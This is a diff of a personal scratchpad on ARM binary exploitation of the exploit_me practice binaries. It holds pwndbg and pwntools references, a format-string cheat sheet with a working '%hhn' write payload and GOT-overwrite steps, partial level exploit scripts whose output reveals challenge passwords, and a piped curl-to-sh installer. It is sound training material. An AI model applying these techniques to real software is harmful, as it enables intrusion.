@@ -1,14 +1,13 @@
-## scratchpad - random notes ###
+## scratchpad - random notes
 
-
-### ARM binary exploitation: ###
+### ARM binary exploitation:
 
 https://github.com/bkerler/exploit_me
 
-
-#### Setup ####
+#### Setup
 
 From exploit_me/scripts/setup.sh:
+
 ```
 #!/bin/sh
 sudo apt-get update
@@ -24,15 +23,19 @@ sudo cp /usr/arm-linux-gnueabi/lib/libc.so.6 /lib
 ```
 
 pwndbg install:
+
 ```
 curl --proto '=https' --tlsv1.2 -LsSf 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb
 ```
+
 OR grab a release:
+
 ```
 https://github.com/pwndbg/pwndbg/releases
 ```
 
 pwntools:
+
 ```
 python3 -m venv ./pwntools
 cd pwntools
@@ -40,22 +43,24 @@ bin/python -m pip install --upgrade pip
 bin/python -m pip install --upgrade pwntools
 ```
 
-#### Analysis ####
+#### Analysis
 
 ```
 file
 strings
 ```
 
-#### Debugging ####
+#### Debugging
 
 From exploit_me/bin/arm for 32-bit:
+
 ```
 #!/bin/sh
 qemu-arm -g 1234 -L /usr/arm-linux-gnueabi $*
 ```
 
 From exploit_me/bin/arm64 for 64-bit:
+
 ```
 #!/bin/sh
 qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu $*
@@ -63,26 +68,24 @@ qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu $*
 
 Shell 1:
 Execute the target binary - ready for remote debugging on port 1234:
+
 ```
 ./arm exploit
 ```
 
 Shell 2:
+
 ```
 pwndbg ./exploit
 target remote localhost:1234
 ```
 
-
-
-
 # Overall exploitation process
+
 1. analyze next level's function in ghidra for an idea of what the challenge is
 2. copy new pwntools script and based on function in ghidra, grab a target breakpoint address for debugging
 3. format new pwntools script for level's args
 4. debug/exploit
-
-
 
 # pwndbg Quick Reference
 
@@ -92,100 +95,100 @@ Organized by task. Notes for AArch32/ARM targets called out where relevant.
 
 ## Context & state
 
-| Command | Does |
-|---|---|
-| `context` / `ctx` | Redraw the full context (regs, code, stack, backtrace) |
-| `context reg code stack` | Show only chosen panes |
-| `ctx-unset` / `set context-sections` | Configure which panes show |
-| `regs` | Registers (with symbol/deref annotations) |
-| `regs rax rbx` | Specific registers |
-| `aslr` | Show/toggle ASLR (`aslr on/off`) |
+| Command                                  | Does                                                   |
+| ---------------------------------------- | ------------------------------------------------------ |
+| `context` / `ctx`                    | Redraw the full context (regs, code, stack, backtrace) |
+| `context reg code stack`               | Show only chosen panes                                 |
+| `ctx-unset` / `set context-sections` | Configure which panes show                             |
+| `regs`                                 | Registers (with symbol/deref annotations)              |
+| `regs rax rbx`                         | Specific registers                                     |
+| `aslr`                                 | Show/toggle ASLR (`aslr on/off`)                     |
 
 ## Running & stepping
 
-| Command | Does |
-|---|---|
-| `start` | Break at entry (`main` if symbols) and run |
-| `entry` | Break at real ELF entry point |
-| `ni` / `si` | Step over / into (instruction-level) |
-| `n` / `s` | Step over / into (source-level) |
-| `c` | Continue |
-| `nextcall` / `nextret` | Run to next `call` / `ret` |
-| `nextsyscall` | Run to next syscall |
-| `stepover` / `stepuntilasm mov` | Step until an asm pattern |
+| Command                             | Does                                         |
+| ----------------------------------- | -------------------------------------------- |
+| `start`                           | Break at entry (`main` if symbols) and run |
+| `entry`                           | Break at real ELF entry point                |
+| `ni` / `si`                     | Step over / into (instruction-level)         |
+| `n` / `s`                       | Step over / into (source-level)              |
+| `c`                               | Continue                                     |
+| `nextcall` / `nextret`          | Run to next`call` / `ret`                |
+| `nextsyscall`                     | Run to next syscall                          |
+| `stepover` / `stepuntilasm mov` | Step until an asm pattern                    |
 
 ## Breakpoints
 
-| Command | Does |
-|---|---|
-| `b *0x401234` | Break at absolute address |
-| `b *$rebase(0x1234)` | Break at PIE offset (auto-adds load base) |
-| `breakrva 0x1234` | Break at RVA in main binary |
-| `watch *0x...` / `rwatch` / `awatch` | Write / read / access watchpoint |
+| Command                                    | Does                                      |
+| ------------------------------------------ | ----------------------------------------- |
+| `b *0x401234`                            | Break at absolute address                 |
+| `b *$rebase(0x1234)`                     | Break at PIE offset (auto-adds load base) |
+| `breakrva 0x1234`                        | Break at RVA in main binary               |
+| `watch *0x...` / `rwatch` / `awatch` | Write / read / access watchpoint          |
 
 ## Memory inspection
 
-| Command | Does |
-|---|---|
-| `x/32gx $rsp` | Classic gdb examine (g=giant/8B, w=4B on ARM32) |
-| `hexdump 0x... 128` | Hex+ASCII dump |
-| `telescope $rsp 20` | Recursive pointer-chase dump — the workhorse |
-| `stack 20` | `telescope` on the stack pointer |
-| `dq/dd/dw/db addr n` | Dump as qword/dword/word/byte |
-| `search -t bytes "\x90\x90"` | Search all mapped memory |
-| `search -s "/bin/sh"` | String search |
-| `p2p mapA mapB` | Find pointers from region A into B |
+| Command                        | Does                                            |
+| ------------------------------ | ----------------------------------------------- |
+| `x/32gx $rsp`                | Classic gdb examine (g=giant/8B, w=4B on ARM32) |
+| `hexdump 0x... 128`          | Hex+ASCII dump                                  |
+| `telescope $rsp 20`          | Recursive pointer-chase dump — the workhorse   |
+| `stack 20`                   | `telescope` on the stack pointer              |
+| `dq/dd/dw/db addr n`         | Dump as qword/dword/word/byte                   |
+| `search -t bytes "\x90\x90"` | Search all mapped memory                        |
+| `search -s "/bin/sh"`        | String search                                   |
+| `p2p mapA mapB`              | Find pointers from region A into B              |
 
 ## Maps, layout, symbols
 
-| Command | Does |
-|---|---|
-| `vmmap` | Memory map (perms, backing file) |
-| `vmmap heap` / `vmmap libc` | Filter by name |
-| `piebase` | PIE load base |
-| `libc` / `xinfo 0x...` | Resolve an address (which map, offset, section) |
-| `got` / `plt` | Dump GOT / PLT |
-| `nearpc 0x...` | Disassemble around an address |
+| Command                         | Does                                            |
+| ------------------------------- | ----------------------------------------------- |
+| `vmmap`                       | Memory map (perms, backing file)                |
+| `vmmap heap` / `vmmap libc` | Filter by name                                  |
+| `piebase`                     | PIE load base                                   |
+| `libc` / `xinfo 0x...`      | Resolve an address (which map, offset, section) |
+| `got` / `plt`               | Dump GOT / PLT                                  |
+| `nearpc 0x...`                | Disassemble around an address                   |
 
 ## Heap (glibc)
 
-| Command | Does |
-|---|---|
-| `heap` | Chunk listing for current arena |
-| `bins` | All bins (fast/tcache/small/large/unsorted) |
-| `tcache` / `fastbins` | Specific bin views |
-| `top_chunk` / `arena` / `arenas` | Wilderness / arena state |
-| `malloc_chunk 0x...` | Decode a single chunk header |
-| `find_fake_fast 0x...` | Fastbin-attack target scanner |
-| `vis_heap_chunks` | Visual heap layout (great for UAF/overlap) |
+| Command                                | Does                                        |
+| -------------------------------------- | ------------------------------------------- |
+| `heap`                               | Chunk listing for current arena             |
+| `bins`                               | All bins (fast/tcache/small/large/unsorted) |
+| `tcache` / `fastbins`              | Specific bin views                          |
+| `top_chunk` / `arena` / `arenas` | Wilderness / arena state                    |
+| `malloc_chunk 0x...`                 | Decode a single chunk header                |
+| `find_fake_fast 0x...`               | Fastbin-attack target scanner               |
+| `vis_heap_chunks`                    | Visual heap layout (great for UAF/overlap)  |
 
 ## Exploit-dev helpers
 
-| Command | Does |
-|---|---|
-| `cyclic 200` | De Bruijn pattern out |
-| `cyclic -l 0x6161616c` (or `-l $pc`) | Offset lookup from crash value |
-| `checksec` | Mitigations on the binary |
-| `canary` | Locate/print the stack canary |
-| `rop --grep "pop rdi"` | ROP gadget search (ropper/pwntools-backed) |
-| `ropgadget` / `jmpcall` | Alt gadget finders |
-| `dumpargs` | Decode args at current call per calling convention |
-| `plist` / `probeleak` | Scan a region for leaked pointers |
-| `errno` | Decode last errno |
+| Command                                  | Does                                               |
+| ---------------------------------------- | -------------------------------------------------- |
+| `cyclic 200`                           | De Bruijn pattern out                              |
+| `cyclic -l 0x6161616c` (or `-l $pc`) | Offset lookup from crash value                     |
+| `checksec`                             | Mitigations on the binary                          |
+| `canary`                               | Locate/print the stack canary                      |
+| `rop --grep "pop rdi"`                 | ROP gadget search (ropper/pwntools-backed)         |
+| `ropgadget` / `jmpcall`              | Alt gadget finders                                 |
+| `dumpargs`                             | Decode args at current call per calling convention |
+| `plist` / `probeleak`                | Scan a region for leaked pointers                  |
+| `errno`                                | Decode last errno                                  |
 
 ## Address arithmetic & offsets
 
 gdb's expression evaluator underlies pwndbg, so you can subtract addresses directly.
 
-| Command | Does |
-|---|---|
-| `p 0xffffd050 - 0xffffd030` | Subtract addresses → offset (decimal by default) |
-| `p/x A - B` / `p/d A - B` | Force hex / decimal output |
-| `p $sp - $fp` | Registers work; untyped, no scaling |
-| `set $buf = 0x...` / `set $ret = 0x...` | Stash addresses as convenience vars |
-| `p/d ($ret - $buf)` | Reusable offset from stashed vars |
-| `p ($ret - $buf) / 4` | Divide by element size (indexed-write index) |
-| `distance A B` | Delta in hex + decimal at once (if build has it) |
+| Command                                     | Does                                              |
+| ------------------------------------------- | ------------------------------------------------- |
+| `p 0xffffd050 - 0xffffd030`               | Subtract addresses → offset (decimal by default) |
+| `p/x A - B` / `p/d A - B`               | Force hex / decimal output                        |
+| `p $sp - $fp`                             | Registers work; untyped, no scaling               |
+| `set $buf = 0x...` / `set $ret = 0x...` | Stash addresses as convenience vars               |
+| `p/d ($ret - $buf)`                       | Reusable offset from stashed vars                 |
+| `p ($ret - $buf) / 4`                     | Divide by element size (indexed-write index)      |
+| `distance A B`                            | Delta in hex + decimal at once (if build has it)  |
 
 **Pointer-scaling gotcha:** if either operand carries a pointer type, gdb divides the byte difference by `sizeof(*ptr)` automatically — `(int*)a - (int*)b` gives bytes/4, not bytes. Force a raw byte difference by casting both to `char*` or `long`:
 
@@ -206,7 +209,6 @@ Bare hex literals and registers are untyped integers, so `$sp - $fp` is plain ma
 - `cyclic -l $pc` (or `$lr` on ARM, since a stack smash often lands the pattern in the saved LR rather than PC) is the fast offset find.
 - On AArch32 targets: use `w` width in `x/` (4-byte words), and remember `telescope` chases 4-byte pointers automatically once gdb knows the arch.
 - ARM frame-reading: locals are addressed as fixed positive displacements off SP after the prologue reserves the frame (`sub sp, sp, #N`), so `str rX, [sp, #off]` is a spill to the local slot at `off`.
-
 
 # pwntools Quick Reference
 
@@ -245,14 +247,14 @@ context.update(arch='arm', bits=32, endian='little', os='linux')
 context.binary = ELF('./target')     # exe = context.binary
 ```
 
-| Field | Purpose |
-|---|---|
-| `arch` | Drives `asm`, `shellcraft`, packing widths, GDB |
-| `bits` | 32/64; usually implied by `arch` |
-| `endian` | Byte order for `p*`/`u*` and asm |
-| `os` | Syscall/shellcraft target |
-| `log_level` | Verbosity; `'debug'` prints every byte in/out |
-| `terminal` | Command used to open the GDB window (`tmux` split, or e.g. an x-terminal) |
+| Field         | Purpose                                                                     |
+| ------------- | --------------------------------------------------------------------------- |
+| `arch`      | Drives`asm`, `shellcraft`, packing widths, GDB                          |
+| `bits`      | 32/64; usually implied by`arch`                                           |
+| `endian`    | Byte order for`p*`/`u*` and asm                                         |
+| `os`        | Syscall/shellcraft target                                                   |
+| `log_level` | Verbosity;`'debug'` prints every byte in/out                              |
+| `terminal`  | Command used to open the GDB window (`tmux` split, or e.g. an x-terminal) |
 
 **Terminal tip:** run the script inside a `tmux` session with `context.terminal = ['tmux','splitw','-h']` and `gdb.debug()` opens the debugger in a side pane. Without a working terminal set, GDB integration can't spawn a visible window.
 
@@ -367,13 +369,13 @@ pause()                          # hold the script so you can look before it sen
 context.gdb_binary = 'gdb-multiarch'
 ```
 
-| Piece | Purpose |
-|---|---|
-| `gdb.debug(exe, gdbscript=...)` | Start the target under GDB from the start |
-| `gdb.attach(io, gdbscript=...)` | Attach to a live `process`/`remote` |
-| `gdbscript` (`gdb_commands`) | Commands run at launch — breakpoints, layout, etc. |
-| `context.gdb_binary` | Which GDB to invoke (`gdb-multiarch` for cross-arch/ARM) |
-| `context.terminal` | How the GDB window is spawned |
+| Piece                             | Purpose                                                    |
+| --------------------------------- | ---------------------------------------------------------- |
+| `gdb.debug(exe, gdbscript=...)` | Start the target under GDB from the start                  |
+| `gdb.attach(io, gdbscript=...)` | Attach to a live`process`/`remote`                     |
+| `gdbscript` (`gdb_commands`)  | Commands run at launch — breakpoints, layout, etc.        |
+| `context.gdb_binary`            | Which GDB to invoke (`gdb-multiarch` for cross-arch/ARM) |
+| `context.terminal`              | How the GDB window is spawned                              |
 
 **Cross-arch:** for ARM binaries run under QEMU-user, `gdb.debug` wires up the QEMU gdbstub; set `context.gdb_binary='gdb-multiarch'` so the host GDB understands ARM. Pair with pwndbg for the richer `telescope`/`stack` views.
 
@@ -522,8 +524,6 @@ python exploit.py REMOTE     # against the remote host
 - **Offset from LR, not PC** → on ARM a stack smash frequently overwrites the saved LR; `cyclic_find(core.lr)`.
 - **GDB window won't open** → run inside `tmux` and set `context.terminal`; for ARM set `context.gdb_binary='gdb-multiarch'`.
 
-
-
 # Format String Exploitation Cheat Sheet
 
 Practical workflow for FSB bugs, ARM32-focused (AArch32/ARMEL). Covers the bug, manual testing, the read/write primitives, and the pwntools automation. Notes where x86 differs.
@@ -591,15 +591,16 @@ Use `AAAABBBB` (8-byte marker) to catch alignment splits — a misaligned buffer
 
 ## 3. Read primitives
 
-| Specifier | Effect |
-|---|---|
-| `%p` / `%x` | Print a stack word (leak) — walk with many to dump the stack |
-| `%N$p` | **Direct access:** read arg N without padding through earlier ones |
-| `%N$s` | Deref the pointer at N and print as string (**arbitrary read**) |
+| Specifier       | Effect                                                                   |
+| --------------- | ------------------------------------------------------------------------ |
+| `%p` / `%x` | Print a stack word (leak) — walk with many to dump the stack            |
+| `%N$p`        | **Direct access:** read arg N without padding through earlier ones |
+| `%N$s`        | Deref the pointer at N and print as string (**arbitrary read**)    |
 
 **Read vs. pointer discriminator** (the gotcha): `%N$c`/`%N$p` print the *value* at slot N; `%N$s` *derefs* it. If `%N$p` shows a small value like `0x4e`, slot N **holds a byte** (`'N'`), not a pointer. If `%N$p` shows a real pointer and `%N$s` prints your target string, slot N **points at** it — that's your write slot.
 
 **Harvest leaks** by classifying `%N$p` results:
+
 - high stack-range value → stack address
 - `.text`/code pointer → subtract known offset → **PIE base**
 - libc pointer (`__libc_start_main+X` return, or a `0xfbad....` FILE flags word nearby) → **libc base**
@@ -610,11 +611,11 @@ Use `AAAABBBB` (8-byte marker) to catch alignment splits — a misaligned buffer
 
 `%n` writes the **count of characters printed so far** to the pointer at that arg position. Width variants limit the write size:
 
-| Specifier | Writes |
-|---|---|
-| `%n` | 4 bytes (full int) |
-| `%hn` | 2 bytes (short) |
-| `%hhn` | **1 byte** |
+| Specifier | Writes             |
+| --------- | ------------------ |
+| `%n`    | 4 bytes (full int) |
+| `%hn`   | 2 bytes (short)    |
+| `%hhn`  | **1 byte**   |
 
 **Controlling the value = controlling how much you print.** `%<W>c` prints one char padded to a field width of `W` → emits `W` characters → the counter reaches `W`.
 
@@ -631,15 +632,18 @@ The field-width number you type **equals** the output-character count **equals**
 Goal: flip a byte from `'N'` (`0x4E`) to `'Y'` (`0x59` = **89**), where a **pointer to the N already sits on the stack**.
 
 **Recon:**
+
 ```
 %5$p   ->  a real pointer (not 0x4e)     : slot 5 is a pointer
 %5$s   ->  prints "N"                    : it points AT the N
 ```
 
 **Exploit (manual):**
+
 ```
 %89c%5$hhn
 ```
+
 - `%89c` prints 89 chars → counter = 89
 - `%5$hhn` writes `89 = 0x59 = 'Y'` to `*(slot 5)`
 
@@ -660,15 +664,16 @@ io.sendlineafter(b'prompt', payload)
 print(repr(payload))     # inspect what it built
 ```
 
-| Arg | Meaning |
-|---|---|
-| `offset` | The `%N$` index where **your buffer's first word** appears (from step 2). Anchor, not the write slot. |
-| `{addr: value}` | Write `value` to `addr`. Multi-byte handled automatically. |
-| `write_size` | `'byte'`=`%hhn`, `'short'`=`%hn` (usual sweet spot for full addresses), `'int'`=`%n`. |
+| Arg               | Meaning                                                                                                      |
+| ----------------- | ------------------------------------------------------------------------------------------------------------ |
+| `offset`        | The`%N$` index where **your buffer's first word** appears (from step 2). Anchor, not the write slot. |
+| `{addr: value}` | Write`value` to `addr`. Multi-byte handled automatically.                                                |
+| `write_size`    | `'byte'`=`%hhn`, `'short'`=`%hn` (usual sweet spot for full addresses), `'int'`=`%n`.            |
 
 **Why the offset differs from the manual index:** `offset` is your *buffer's* anchor; pwntools then adds the words its own `%<W>c`/padding prefix occupies to place the address word, so the emitted `$` index shifts. In our case `offset=2` produced `%5$hhn` (2 + 3 prefix/alignment words = 5) — byte-identical to the manual payload, reached via a different coordinate system. Find `offset` empirically (where your marker lands), pass it, and let pwntools compute the final index. Always `print(repr(payload))` to verify.
 
 **When to use which:**
+
 - **Manual `%Bc%N$hhn`** — writing through a pointer **already on the stack** (randomized target, single input). `fmtstr_payload` can't express this.
 - **`fmtstr_payload`** — writing a **known/static address** you supply yourself (GOT overwrite, global in a no-PIE binary), especially multi-byte writes where it handles the `%hhn` chunking, field-width bumps, and aligned address block for you.
 
@@ -678,12 +683,12 @@ print(repr(payload))     # inspect what it built
 
 Run `checksec`. Each affects the write path:
 
-| Finding | Impact |
-|---|---|
-| **Partial RELRO** | GOT writable → **GOT overwrite** is the clean target |
-| **Full RELRO** | GOT read-only → pivot to saved **LR** on stack, `.fini_array`, exit handlers |
+| Finding                                         | Impact                                                                                                                                                                    |
+| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Partial RELRO**                         | GOT writable →**GOT overwrite** is the clean target                                                                                                                |
+| **Full RELRO**                            | GOT read-only → pivot to saved**LR** on stack, `.fini_array`, exit handlers                                                                                      |
 | **`__printf_chk` in imports** (FORTIFY) | `%n` in a writable-segment format usually **aborts**; non-contiguous `%N$` rejected. Reads still work; writes via `%n` often dead — confirm before investing |
-| **PIE** | GOT/`.text` targets need a leak first |
+| **PIE**                                   | GOT/`.text` targets need a leak first                                                                                                                                   |
 
 ---
 
@@ -724,10 +729,7 @@ GOT entry of a function called **after** the vulnerable `printf` (so the patched
 7. Fire; recvall(timeout=2) or interactive()
 ```
 
-
-
-
-# personal pwntools template
+# pwntools template
 
 ```
 #!/home/dvader/tools/pwntools/bin/python3
@@ -782,12 +784,15 @@ else:
 # T0 - 
 
 ```
+
 Run modes:
+
 ```
 python exploit.py INTERACTIVE    # local, interactive debugging w/ set breakpoint
 ```
 
 # exploit_me ARM binary - level 2:
+
 ```
 #!/home/dvader/tools/pwntools/bin/python3
 
@@ -854,7 +859,9 @@ b'Level 3 Password: "Velvet"\n'
 
 
 ```
+
 # exploit_me ARM binary - level 3:
+
 ```
 #!/home/dvader/tools/pwntools/bin/python3
 
@@ -993,7 +1000,7 @@ pwndbg> stack 36
 23:008c│ r11 0x407ffd4c —▸ 0x11464 ◂— push {r11, lr}
 '''
 '''
-└─$ ./l3.py            
+└─$ ./l3.py          
 [+] Starting local process '/usr/bin/qemu-arm': pid 3028538
 [*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-n_qsz3l3.gdb']
 [+] Receiving all data: Done (66B)
@@ -1001,8 +1008,3 @@ pwndbg> stack 36
 b'filling array position 33 with 70756\nLevel 4 Password: "mysecret"\n'
 '''
 ```
-
-
-
-
-
